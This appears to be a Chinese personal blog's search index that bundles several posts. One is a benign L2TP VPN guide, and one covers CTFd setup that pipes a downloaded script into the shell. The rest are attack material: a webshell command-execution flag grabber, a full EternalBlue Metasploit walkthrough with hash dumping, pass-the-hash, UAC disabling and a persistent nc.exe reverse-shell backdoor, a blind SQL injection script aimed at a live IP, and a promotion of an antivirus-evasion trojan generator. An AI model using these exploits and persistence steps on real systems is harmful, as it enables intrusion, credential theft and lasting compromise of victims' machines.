<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>利用一句话获取自动获取flag</title>
    <url>/2022/10/24/AWD%E8%8E%B7%E5%8F%96flag%E8%84%9A%E6%9C%AC/</url>
    <content><![CDATA[<p>注意事项：</p>
<p>1，此脚本支持post-get两种一句话木马传参。</p>
<p>2，使用后会在目录生成txt文件，查看txt文件即可获取flag。</p>
<p>3，次脚本只限在AWD攻防中使用。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pdb import post_mortem</span><br><span class="line">from turtle import pos</span><br><span class="line">from urllib import request</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">flag = &quot;cat flag.txt&quot; # 需要执行的命令</span><br><span class="line">flag1 = &quot;cat flag1.txt&quot;</span><br><span class="line">flag_1 = &quot;http://192.168.20.140/&quot; # 目标url</span><br><span class="line">flag_2 = &quot;index.php?&quot; # 木马地址</span><br><span class="line">flag_3 = &quot;a&quot; # 连接密码</span><br><span class="line">flag_4 = &quot;=system(%27&quot;+flag+&quot;%27);&quot; # Get需要执行的命令</span><br><span class="line">flag_5 = &quot;system(&#x27;&quot;+flag1+&quot;&#x27;);&quot; # Post需要执行的命令</span><br><span class="line">list = [] # 获取flag的传递值</span><br><span class="line"></span><br><span class="line">def get():</span><br><span class="line">    response = requests.get(flag_1 + flag_2)</span><br><span class="line">    response = response.status_code # 返回url响应值</span><br><span class="line">    twohundred = 200</span><br><span class="line">    if response == twohundred: # 判断response的响应值是否未200</span><br><span class="line"></span><br><span class="line">        flag_6 = requests.get(flag_1 + flag_2 + flag_3 + flag_4)</span><br><span class="line">        #print(re.search(&quot;flag&#123;.*&#125;&quot;, flag_6.text)) # 获取flag长度</span><br><span class="line">        list.append(re.search(&quot;flag&#123;.*&#125;&quot;, flag_6.text).group(0)[:13])</span><br><span class="line">        </span><br><span class="line">    else:</span><br><span class="line">        print(2)</span><br><span class="line"></span><br><span class="line">def post():</span><br><span class="line">    data = &#123;flag_3:flag_5&#125;</span><br><span class="line">    response = requests.post(flag_1+flag_2)</span><br><span class="line">    response = response.status_code # 返回url响应值</span><br><span class="line">    twohundred = 200</span><br><span class="line">    if response == twohundred: # 判断response的响应值是否未200</span><br><span class="line">        flag_6 = requests.post(flag_1+flag_2,data=data)</span><br><span class="line">        #print(re.search(&quot;flag&#123;.*&#125;&quot;, flag_6.text)) # 获取flag长度</span><br><span class="line">        list.append(re.search(&quot;flag&#123;.*&#125;&quot;, flag_6.text).group(0)[:13])</span><br><span class="line">    else:</span><br><span class="line">        print(2)</span><br><span class="line">get()</span><br><span class="line">post()</span><br><span class="line"></span><br><span class="line">if list[0] == list[1]:</span><br><span class="line">    #print(list[0]) </span><br><span class="line">    Note=open(&#x27;flag.txt&#x27;,mode=&#x27;w&#x27;)</span><br><span class="line">    Note.write(list[0]+&quot; \n&quot;)</span><br><span class="line">else:</span><br><span class="line">    for i in range(0,2):</span><br><span class="line">        #print(list[i])</span><br><span class="line">        Note=open(&#x27;flag.txt&#x27;,mode=&#x27;w&#x27;)</span><br><span class="line">        Note.write(list[0]+&quot; \n&quot;)</span><br><span class="line">        Note.write(list[i]+&quot; \n&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>技术</tag>
      </tags>
  </entry>
  <entry>
    <title>部署CTFd</title>
    <url>/2022/12/11/CTFd/</url>
    <content><![CDATA[<h2 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://fishros.com/install -O fishros &amp;&amp; . fishros</span><br></pre></td></tr></table></figure>

<h2 id="安装docker-compose"><a href="#安装docker-compose" class="headerlink" title="安装docker-compose"></a>安装docker-compose</h2><p>安装docker-compose</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo curl -L &quot;https://github.com/docker/compose/releases/download/1.24.1/docker-compose-$(uname -s)-$(uname -m)&quot; -o /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure>

<p>添加运行权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo chmod +x /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure>

<p>查看docker-compose</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose --version</span><br></pre></td></tr></table></figure>

<h2 id="安装H1ve"><a href="#安装H1ve" class="headerlink" title="安装H1ve"></a>安装H1ve</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改hosts</span><br><span class="line">cd /etc</span><br><span class="line">sudo rm -rf hosts</span><br><span class="line">sudo wget https://cdn.jsdelivr.net/gh/521xueweihan/GitHub520@main/hosts</span><br><span class="line">下载H1ve</span><br><span class="line">git clone https://github.com/D0g3-Lab/H1ve.git H1ve-1.1.3</span><br><span class="line">启动服务</span><br><span class="line">cd H1ve-1.1.3</span><br><span class="line">docker-compose -f single.yml up -d</span><br><span class="line">停止服务</span><br><span class="line">docker-compose -f single.yml stop</span><br></pre></td></tr></table></figure>

<h2 id="访问CTFd"><a href="#访问CTFd" class="headerlink" title="访问CTFd"></a>访问CTFd</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1:8000</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>Centos7-L2TP VPN</title>
    <url>/2022/10/23/L2TPVPN/</url>
    <content><![CDATA[<h1 id="什么是L2TPVPN"><a href="#什么是L2TPVPN" class="headerlink" title="什么是L2TPVPN"></a>什么是L2TPVPN</h1><p>L2TP VPN概述</p>
<p>什么是L2TP？</p>
<p>L2TP代表第2层隧道协议，它本身不提供任何加密。 L2TP VPN通常使用身份验证协议IPSec（Internet协议安全性）进行强大的加密和身份验证，这使其在某些其他最常用的协议（如PPTP）上具有最终优势。 L2TP协议使用UDP端口1701。</p>
<p>L2TP如何工作？</p>
<p>通过L2TP &#x2F; IPSec协议传输的数据通常会进行两次身份验证。经由隧道传输的每个数据包均包含L2TP报头。结果，数据被伺服器解复用。数据的双重身份验证会降低性能，但是确实提供了最高的安全性。</p>
<h2 id="1-配置yum源"><a href="#1-配置yum源" class="headerlink" title="1.配置yum源"></a>1.配置yum源</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum服务</span><br><span class="line">cd /etc/yum.repos.d/</span><br><span class="line">ls</span><br><span class="line">rm -rf *</span><br><span class="line">vi dvd.repo</span><br><span class="line">[dvd]</span><br><span class="line">name=dvd</span><br><span class="line">baseurl=file:///dvd</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line">​</span><br><span class="line">mkdir /dvd</span><br><span class="line">mount /dev/cdrom /dvd</span><br><span class="line">​</span><br><span class="line">yum install -y 服务</span><br></pre></td></tr></table></figure>
<h2 id="2-修改成网络源"><a href="#2-修改成网络源" class="headerlink" title="2.修改成网络源"></a>2.修改成网络源</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">下载阿里云</span><br><span class="line">wget -O /etc/yum.repos.d/CentOS-Base-epel.repo http://mirrors.aliyun.com/repo/Centos-7.repo</span><br><span class="line">清理缓存</span><br><span class="line">yum clean all</span><br><span class="line">重新生成缓存</span><br><span class="line">yum makecache</span><br><span class="line">​</span><br><span class="line">安装EPEL源（CentOS7官方源中已经去掉了xl2tpd）</span><br><span class="line">yum install -y epel-release</span><br></pre></td></tr></table></figure>
<h2 id="3-安装依赖包"><a href="#3-安装依赖包" class="headerlink" title="3.安装依赖包"></a>3.安装依赖包</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">​</span><br><span class="line">yum install -y make gcc gmp-devel xmlto bison flex xmlto libpcap-devel lsof vim-enhanced man</span><br><span class="line">​</span><br><span class="line">yum install -y xl2tpd</span><br><span class="line">​</span><br><span class="line">​</span><br><span class="line">yum install -y libreswan</span><br></pre></td></tr></table></figure>
<h2 id="4、修改ipsec的配置文件"><a href="#4、修改ipsec的配置文件" class="headerlink" title="4、修改ipsec的配置文件"></a>4、修改ipsec的配置文件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/ipsec.conf（只添加一行nat_traversal=yes即可）</span><br></pre></td></tr></table></figure>

<h2 id="5、建立ipsec-与-l2tp-服务关联的配置文件"><a href="#5、建立ipsec-与-l2tp-服务关联的配置文件" class="headerlink" title="5、建立ipsec 与 l2tp 服务关联的配置文件"></a>5、建立ipsec 与 l2tp 服务关联的配置文件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/ipsec.d/l2tp_psk.conf</span><br><span class="line">​</span><br><span class="line">conn L2TP-PSK-NAT</span><br><span class="line">    rightsubnet=vhost:%priv</span><br><span class="line">    also=L2TP-PSK-noNAT</span><br><span class="line">conn L2TP-PSK-noNAT</span><br><span class="line">    authby=secret</span><br><span class="line">    pfs=no</span><br><span class="line">    auto=add</span><br><span class="line">    keyingtries=3</span><br><span class="line">    dpddelay=30</span><br><span class="line">    dpdtimeout=120</span><br><span class="line">    dpdaction=clear</span><br><span class="line">    rekey=no</span><br><span class="line">    ikelifetime=8h</span><br><span class="line">    keylife=1h</span><br><span class="line">    type=transport</span><br><span class="line">    left=192.168.0.200   ###192.168.0.200 是自己的网卡Ip地址</span><br><span class="line">    leftprotoport=17/1701</span><br><span class="line">    right=%any</span><br><span class="line">    rightprotoport=17/%any</span><br><span class="line">​</span><br></pre></td></tr></table></figure>
<h2 id="6、当建立l2tp连接时，需要输入预共享密匙，以下为预共享密匙的配置文件。"><a href="#6、当建立l2tp连接时，需要输入预共享密匙，以下为预共享密匙的配置文件。" class="headerlink" title="6、当建立l2tp连接时，需要输入预共享密匙，以下为预共享密匙的配置文件。"></a>6、当建立l2tp连接时，需要输入预共享密匙，以下为预共享密匙的配置文件。</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#如果这个文件也没有也需要手动创建，访问的IP地址和密码</span><br><span class="line">vim /etc/ipsec.d/ipsec.secrets</span><br><span class="line">​</span><br><span class="line">#include /etc/ipsec.d/*.secrets</span><br><span class="line">192.168.0.200 %any: PSK &quot;123456789&quot;</span><br></pre></td></tr></table></figure>
<h2 id="7、修改内核支持，可以对照以下配置修改，修改完后运行sysctl-p-使配置生效"><a href="#7、修改内核支持，可以对照以下配置修改，修改完后运行sysctl-p-使配置生效" class="headerlink" title="7、修改内核支持，可以对照以下配置修改，修改完后运行sysctl -p 使配置生效"></a>7、修改内核支持，可以对照以下配置修改，修改完后运行sysctl -p 使配置生效</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/sysctl.conf</span><br><span class="line">​</span><br><span class="line">vim /etc/sysctl.conf</span><br><span class="line">​</span><br><span class="line">net.ipv4.ip_forward = 1</span><br><span class="line">net.ipv4.conf.default.accept_redirects  = 0</span><br><span class="line">net.ipv4.conf.default.send_redirects  = 0</span><br><span class="line">net.ipv4.conf.eno16777736.rp_filter = 0</span><br><span class="line">net.ipv4.conf.default.rp_filter  = 0</span><br><span class="line">​</span><br><span class="line">sysctl -p</span><br><span class="line">net.ipv4.ip_forward = 1</span><br><span class="line">net.ipv4.conf.all.accept_redirects = 0</span><br><span class="line">net.ipv4.conf.all.rp_filter = 0</span><br><span class="line">net.ipv4.conf.all.send_redirects = 0</span><br><span class="line">net.ipv4.conf.default.accept_redirects = 0</span><br><span class="line">net.ipv4.conf.default.rp_filter = 0</span><br><span class="line">net.ipv4.conf.default.send_redirects = 0</span><br><span class="line">net.ipv4.conf.lo.accept_redirects = 0</span><br><span class="line">net.ipv4.conf.lo.rp_filter = 0</span><br><span class="line">net.ipv4.conf.lo.send_redirects = 0</span><br></pre></td></tr></table></figure>

<h2 id="8、检验ipsec服务配置"><a href="#8、检验ipsec服务配置" class="headerlink" title="8、检验ipsec服务配置"></a>8、检验ipsec服务配置</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#重启ipsec</span><br><span class="line">systemctl restart ipsec</span><br><span class="line"></span><br><span class="line">#检验ipsec服务配置 </span><br><span class="line">ipsec verify</span><br><span class="line">systemctl status ipsec</span><br></pre></td></tr></table></figure>


<h2 id="9、启动服务"><a href="#9、启动服务" class="headerlink" title="9、启动服务"></a>9、启动服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#启动ipsec </span><br><span class="line">systemctl start ipsec</span><br><span class="line"></span><br><span class="line">#设置为开机自启 </span><br><span class="line">systemctl enable ipsec</span><br></pre></td></tr></table></figure>
<h2 id="10、修改L2tp的配置文件"><a href="#10、修改L2tp的配置文件" class="headerlink" title="10、修改L2tp的配置文件"></a>10、修改L2tp的配置文件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/xl2tpd/xl2tpd.conf </span><br><span class="line"></span><br><span class="line">[global]</span><br><span class="line"> listen-addr = 192.168.0.197    ###本机外网网卡IP</span><br><span class="line"> ipsec saref = yes      ###取消注释</span><br><span class="line">[lns default]</span><br><span class="line">ip range = 192.168.0.128-192.168.0.254</span><br><span class="line">local ip = 192.168.0.99</span><br><span class="line">require chap = yes</span><br><span class="line">refuse pap = yes</span><br><span class="line">require authentication = yes</span><br><span class="line">name = Linux×××server</span><br><span class="line">ppp debug = yes</span><br><span class="line">pppoptfile = /etc/ppp/options.xl2tpd</span><br><span class="line">length bit = yes</span><br></pre></td></tr></table></figure>
<h2 id="11、修改xl2tpd属性配置文件"><a href="#11、修改xl2tpd属性配置文件" class="headerlink" title="11、修改xl2tpd属性配置文件"></a>11、修改xl2tpd属性配置文件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/ppp/options.xl2tpd</span><br><span class="line"></span><br><span class="line">require-mschap-v2   ###添加此行</span><br><span class="line">ipcp-accept-local</span><br><span class="line">ipcp-accept-remote</span><br><span class="line">#dns 写自己的网卡DNS ，写成8.8.8.8也行</span><br><span class="line">ms-dns 192.168.0.2 </span><br><span class="line">#ms-dns  8.8.8.8</span><br><span class="line">noccp</span><br><span class="line">auth</span><br><span class="line">crtscts</span><br><span class="line">idle 1800</span><br><span class="line">mtu 1410</span><br><span class="line">mru 1410</span><br><span class="line">nodefaultroute</span><br><span class="line">debug</span><br><span class="line">lock</span><br><span class="line">proxyarp</span><br><span class="line">connect-delay 5000</span><br></pre></td></tr></table></figure>
<h2 id="12、添加用户名和密码（-登录的用户名和密码"><a href="#12、添加用户名和密码（-登录的用户名和密码" class="headerlink" title="12、添加用户名和密码（**登录的用户名和密码"></a>12、添加用户名和密码（**登录的用户名和密码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/ppp/chap-secrets</span><br><span class="line"></span><br><span class="line"># Secrets for authentication using CHAP</span><br><span class="line"># client        server  secret                  IP addresses</span><br><span class="line">test      *  123 *</span><br></pre></td></tr></table></figure>
<h2 id="13、iptables安装配置"><a href="#13、iptables安装配置" class="headerlink" title="13、iptables安装配置"></a>13、iptables安装配置</h2><h3 id="1-安装iptable-iptable-service"><a href="#1-安装iptable-iptable-service" class="headerlink" title="1.安装iptable iptable-service"></a>1.安装iptable iptable-service</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install -y iptables</span><br><span class="line">yum install iptables-services</span><br></pre></td></tr></table></figure>
<h3 id="2-禁用-x2F-停止自带的firewalld服务"><a href="#2-禁用-x2F-停止自带的firewalld服务" class="headerlink" title="2.禁用&#x2F;停止自带的firewalld服务"></a>2.禁用&#x2F;停止自带的firewalld服务</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#停止firewalld服务</span><br><span class="line">systemctl stop firewalld</span><br><span class="line"></span><br><span class="line">#冻结firewalld服务</span><br><span class="line">systemctl mask firewalld</span><br></pre></td></tr></table></figure>
<h3 id="3设置现有规则"><a href="#3设置现有规则" class="headerlink" title="3设置现有规则"></a>3设置现有规则</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查看iptables现有规则</span><br><span class="line">iptables -L -n</span><br><span class="line"></span><br><span class="line">#先允许所有,不然有可能会杯具</span><br><span class="line">iptables -P INPUT ACCEPT</span><br><span class="line"></span><br><span class="line">#清空所有默认规则</span><br><span class="line">iptables -F</span><br><span class="line"></span><br><span class="line">#清空所有自定义规则</span><br><span class="line">iptables -X</span><br><span class="line"></span><br><span class="line">#所有计数器归0</span><br><span class="line">iptables -Z</span><br></pre></td></tr></table></figure>
<h3 id="4-开启地址转换-eth0为外网网卡，根据实际情况替换"><a href="#4-开启地址转换-eth0为外网网卡，根据实际情况替换" class="headerlink" title="4.开启地址转换(eth0为外网网卡，根据实际情况替换"></a>4.开启<strong>地址转换(eth0为外网网卡，</strong><strong><strong>根据实际情况替换</strong></strong></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables -t nat -A POSTROUTING -s 192.168.0.0/24 -o eno16777736 -j MASQUERADE</span><br><span class="line">iptables -I FORWARD -s 192.168.0.0/24 -j ACCEPT</span><br><span class="line">iptables -I FORWARD -d 192.168.0.0/24 -j ACCEPT</span><br><span class="line"> </span><br><span class="line">iptables -A INPUT -p udp -m policy --dir in --pol ipsec -m udp --dport 1701 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p udp -m udp --dport 1701 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p udp -m udp --dport 500 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p udp -m udp --dport 4500 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p esp -j ACCEPT</span><br><span class="line">iptables -A INPUT -m policy --dir in --pol ipsec -j ACCEPT</span><br><span class="line"> </span><br><span class="line">iptables -A FORWARD -i ppp+ -m state --state NEW,RELATED,ESTABLISHED -j ACCEPT</span><br><span class="line">iptables -A FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br><span class="line"> </span><br><span class="line">service iptables save</span><br><span class="line">/bin/systemctl restart iptables.service</span><br></pre></td></tr></table></figure>
<h2 id="14、完成服务配置"><a href="#14、完成服务配置" class="headerlink" title="14、完成服务配置"></a>14、完成服务配置</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#启动xl2tp服务 </span><br><span class="line">systemctl start xl2tpd</span><br><span class="line"> </span><br><span class="line">#设置开机自启 </span><br><span class="line">systemctl enable xl2tpd</span><br><span class="line"> </span><br><span class="line">#查看状态 </span><br><span class="line">systemctl status xl2tpd</span><br></pre></td></tr></table></figure>

<h1 id="作者QQ：2565543706"><a href="#作者QQ：2565543706" class="headerlink" title="作者QQ：2565543706"></a>作者QQ：2565543706</h1>]]></content>
  </entry>
  <entry>
    <title>Windows7-永恒之蓝</title>
    <url>/2022/11/27/Metasploit/</url>
    <content><![CDATA[<h1 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h1><h2 id="永恒之蓝："><a href="#永恒之蓝：" class="headerlink" title="永恒之蓝："></a>永恒之蓝：</h2><h3 id="打入靶机"><a href="#打入靶机" class="headerlink" title="打入靶机"></a>打入靶机</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo msfconsole</span><br><span class="line"></span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line"></span><br><span class="line">set rhost 目标靶机IP</span><br><span class="line"></span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line">set lhost 操作机IP</span><br><span class="line"></span><br><span class="line">run - exp</span><br><span class="line"></span><br><span class="line">shell &gt; whoami </span><br></pre></td></tr></table></figure>

<h3 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">启用远程桌面</span><br><span class="line">meterpreter &gt; run post/windows/manage/enable_rdp</span><br><span class="line"></span><br><span class="line">创建一个新用户来远程连接 win7 桌面</span><br><span class="line">meterpreter &gt; run post/windows/manage/enable_rdp USERNAME=xuegod PASSWORD=123456</span><br><span class="line"></span><br><span class="line">进行远程桌面</span><br><span class="line">rdesktop 192.168.1.56[地址为靶机地址]</span><br><span class="line"></span><br><span class="line">通过 ms17-010 永恒之蓝获取到的 shell 可能会出现操作受限的情况，所以我们使用主机的账户信息建立 session 进行连接。</span><br><span class="line">SAM 概述：SAM 文件即账号密码数据库文件，SAM 文件的位置是：</span><br><span class="line">C:\Windows\System32\config\SAM</span><br><span class="line"></span><br><span class="line">我们回到 MSF 控制台，从 SAM 导出密码哈希</span><br><span class="line">meterpreter &gt; hashdump</span><br><span class="line"></span><br><span class="line">我们取刚创建的 xuegod 用户的 hash 密码</span><br><span class="line">xuegod:1001:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4::</span><br><span class="line"></span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">C:\Windows\system32&gt;netsh firewall add portopening TCP 4444 &quot;xuegod&quot; ENABLE ALL</span><br><span class="line"></span><br><span class="line">关闭 UAC</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">C:\Windows\system32&gt;cmd.exe /k %windir%\System32\reg.exe ADDHKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f</span><br><span class="line"></span><br><span class="line">开启 win7 系统主机的默认共享，默认共享对 Windows 主机的文件共享非常方便，也方便黑客利用</span><br><span class="line">这个功能，远程执行命令。</span><br><span class="line">C:\Windows\system32&gt;cmd.exe /k %windir%\System32\reg.exe ADDHKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;exit #退出 shell 返回 meterpreter</span><br><span class="line">C:\Windows\system32&gt;exit</span><br><span class="line">C:\Windows\system32&gt;exit</span><br><span class="line">exit</span><br><span class="line"></span><br><span class="line">我们先将 session 保存到后台</span><br><span class="line">meterpreter &gt; background</span><br><span class="line"></span><br><span class="line">3、使用 hash 值登录系统</span><br><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; use exploit/windows/smb/psexec</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set RHOSTS 192.168.1.56</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set LHOST 192.168.1.53</span><br><span class="line">配置用户信息</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set SMBUser xuegod</span><br><span class="line">密码使用哈希值</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set SMBPass </span><br><span class="line">aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4</span><br><span class="line"></span><br><span class="line">这里局域网中 SMBDomain 都是 WORKGROUP 如果是域用户需要配置域名称。</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set SMBDomainWORKGROUP</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; exploit</span><br><span class="line"></span><br><span class="line">下面我们配置一个后门程序，修改 UAC 的注册表，需要重启才能生效。</span><br><span class="line">上传 nc 到 Win7</span><br><span class="line">meterpreter &gt; upload /usr/share/windows-binaries/nc.exe C:\\windows</span><br><span class="line"></span><br><span class="line">注册表添加启动项执行 nc 反弹 shell 命令</span><br><span class="line">meterpreter &gt; reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d &#x27;C:\windows\nc.exe -Ldp 443 -e cmd.exe&#x27;</span><br><span class="line"></span><br><span class="line">nc 参数解释：</span><br><span class="line">L 表示用户退出连接后重新进行端口侦听</span><br><span class="line">d 后台运行</span><br><span class="line">p 指定端口</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line"></span><br><span class="line">防火墙允许 443 端口访问网络否则开机的时需要用户点击允许访问网络才可以成功执行。</span><br><span class="line">C:\Windows\system32&gt; netsh firewall add portopening TCP 443 &quot;xuegod443&quot; ENABLE AL</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>技术</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入盲注脚本</title>
    <url>/2022/10/24/SQL%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/</url>
    <content><![CDATA[<p>本脚本<br>仅限于靶场使用，请勿用于未授权的违法攻击！！<br>用户滥用造成的一切后果自负！！<br>使用者请务必遵守当地法律！！</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">url = &quot;http://1.14.71.254:28939/index.php&quot;</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line"></span><br><span class="line">    for i in range(1, 100):</span><br><span class="line">        mina = 33</span><br><span class="line">        maxa = 130</span><br><span class="line">        mid = int((maxa - mina) / 2)</span><br><span class="line">        while True:</span><br><span class="line">            payload = &#123;</span><br><span class="line">                &#x27;id&#x27;: &#x27;0^&#x27; + &#x27;(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))&gt;&#123;&#125;)&#x27;.format(i, mid)</span><br><span class="line">            &#125;</span><br><span class="line">            print(payload)</span><br><span class="line">            res = requests.post(url=url, data=payload).text</span><br><span class="line">            time.sleep(0.005)</span><br><span class="line">            # print(res)</span><br><span class="line">            if &#x27;Hello&#x27; in res:</span><br><span class="line">                mina = mid</span><br><span class="line">                mid = int((maxa + mina) / 2)</span><br><span class="line">            else:</span><br><span class="line">                maxa = mid</span><br><span class="line">                mid = int((maxa + mina) / 2)</span><br><span class="line">            print(&quot;此时的最大值为&#123;&#125;, 最小值为&#123;&#125;, 中间值为&#123;&#125;&quot;.format(maxa,mina,mid))</span><br><span class="line">            if (maxa-mina) &lt;= 1:</span><br><span class="line">                flag += chr(maxa)</span><br><span class="line">                print(flag)</span><br><span class="line">                break</span><br><span class="line">        if &#x27;&#125;&#x27; in flag:</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>技术</tag>
      </tags>
  </entry>
  <entry>
    <title>红队专用免杀木马生成工具</title>
    <url>/2022/10/17/cuiri/</url>
    <content><![CDATA[<h1 id="摧日：CuiRi-红队专用免杀木马生成工具"><a href="#摧日：CuiRi-红队专用免杀木马生成工具" class="headerlink" title="摧日：CuiRi 红队专用免杀木马生成工具"></a>摧日：CuiRi 红队专用免杀木马生成工具</h1><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://img.shields.io/badge/%E4%BD%9C%E8%80%85-Dubh3-green" alt="Author" data-caption="Author" loading="lazy">  <img onerror="imgOnError(this);" data-fancybox="gallery" src="https://img.shields.io/badge/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80-Golang-green" alt="language" data-caption="language" loading="lazy"> <img onerror="imgOnError(this);" data-fancybox="gallery" src="https://img.shields.io/badge/%E7%89%88%E6%9C%AC-1.0-brightgreen" alt="version" data-caption="version" loading="lazy"> <img onerror="imgOnError(this);" data-fancybox="gallery" src="https://img.shields.io/badge/%E5%BC%80%E6%94%BE%E5%8D%8F%E8%AE%AE-Apache%202.0-brightgreen.svg" alt="开放协议" data-caption="开放协议" loading="lazy"></p>
<h3 id="0x01-简介："><a href="#0x01-简介：" class="headerlink" title="0x01 简介："></a>0x01 简介：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">   ____   __    __    _____      ______      _____  </span><br><span class="line">  / ___)  ) )  ( (   (_   _)    (   __ \    (_   _) </span><br><span class="line"> / /     ( (    ) )    | |       ) (__) )     | |   </span><br><span class="line">( (       ) )  ( (     | |      (    __/      | |   </span><br><span class="line">( (      ( (    ) )    | |       ) \ \  _     | |   </span><br><span class="line"> \ \___   ) \__/ (    _| |__    ( ( \ \_))   _| |__ </span><br><span class="line">  \____)  \______/   /_____(     )_) \__/   /_____( </span><br><span class="line"></span><br><span class="line">摧日：一款红队专用免杀木马生成器，基于shellcode生成绕过所有杀软的木马</span><br></pre></td></tr></table></figure>

<p>CuiRi 是一款红队专用免杀木马生成器，该工具可以通过红队人员提供的一段 shellcode 快速生成一个绕过所有杀软的可执行木马。</p>
<p><strong>特点</strong></p>
<ul>
<li>1.基于 Syscall 进行免杀，且随机混淆，可过几乎所有杀软</li>
<li>2.内置 go-strip 对 Go 生成的木马进行编译信息抹除与程序信息混淆</li>
<li>3.工具本体只有 1 个 exe，搭配 Go 环境即可直接使用</li>
</ul>
<p>感谢 go-strip 作者 <a href="https://github.com/boy-hack" title="@boy-hack">@boy-hack</a></p>
<h3 id="0x02-使用："><a href="#0x02-使用：" class="headerlink" title="0x02 使用："></a>0x02 使用：</h3><p>从 <a href="https://github.com/NyDubh3/CuiRi/releases/tag/v1.0" title="release">release</a> 中下载二进制文件，并且在系统上安装 Go 语言环境，然后将 shellcode 保存到1个txt文件中，即可使用本工具生成免杀马。</p>
